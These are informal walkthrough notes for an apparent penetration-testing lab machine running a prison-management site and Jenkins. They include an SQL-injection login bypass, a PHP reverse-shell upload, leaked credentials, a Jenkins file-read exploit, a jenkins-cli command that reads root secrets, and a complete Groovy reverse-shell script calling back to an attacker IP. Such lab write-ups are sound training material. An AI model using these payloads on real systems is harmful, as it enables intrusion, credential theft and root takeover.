ports 22, 80, 9443 open
90 is default apache

9443 is some fast5 prison management website
we seachsploit for fast5, nothing
google for it, and some results later, we see prison management is vulnerable to sqli on admin login page
```txt
admin' or '1'='1
123456 # password
```
logs us in

In there, user management /edit users, we find "Caroline Bassey"
Under leave management, we find user "Malcom" and description "Dont forget the password: RonnyCache001"
What a kook!
Malcom: RonnyCache001
So we try ssh ,doesnt work. Neither does ftp. Nor does webpage login

Umm, what?!!

HINT TAKEN: in the edit photo, there's a profile pic, where we can upload a php rev shell

we fire up burp, capture the update profile POST req
modify the body of the image data and paste php rev shell, change the filename to shell.php

just reloading the dashboard gave us rev shell
www-data!

---
we found some database creds in /var/www/html/prison
```
define('DB_USER','root');
define('DB_PASS','sqlCr3ds3xp0seD');
define('DB_NAME','employee_akpoly');

$username = "root";
$password = "sqlCr3ds3xp0seD";
$dbname = "employee_akpoly";

was useless
```
We did find that jenkins thingy config, which said the password is in some root/.jenkins something, but that's in root, so never mind

We did find a password "RonnyCache001" earlier, so let us try to su to some user
/etc/passwd shows user vmdak, and we get shell when we use that password
vmdak!

---
`ss -tulpn | grep -E '(127.0.0.1:|::1:)'` shows ports 3306, 33060, 8080
should we setup reverse ssh?

pspy shows us 
" /usr/bin/java -jar /root/jenkins.war --httpPort=8080 --httpListenAddress=127.0.0.1"
more sign pointing to port forwarding

So we setup ssh for vmdak
and port forward 8080 to 8089
`ssh -L 8089:127.0.0.1:8080 vmdak@192.168.132.103 -i id_rsa_user`
upon visiting 127.0.0.1:8089, we find we need a password
To scrape the jenkins files, we turn to linpeas, so atleast it can point us to logs file, since the webpage insists the passwords are in the logs and /root/.jenkins

HINT TAKEN : searchsploit it!!!
searchsploit jenkins 2.4 gave us java/webapps/51993.py

`python 51993.py -u http://127.0.0.1:8089` asks us for file to download.
started with /etc/passwd. worked!
Then /root/.jenkins/secrets/initialAdminPassword gave 140ef31373034d19a77baa9c6b84a200

we login with this into jenkins, to get a groovy shell terminal, and let it work its magic to get a reverse shell as root
Even though it is not visible, navigate to localhost:IP/script
```groovy
String host="192.168.45.160";
int port=22;
String cmd="sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---
---
---
there's a jenkins-cli.jar that can be used to arbitrary file-read
```bash
 java -jar jenkins-cli.jar -s http://localhost:8080 -http help 1 "@//root/.jenkins/secrets/initialAdminPassword"
```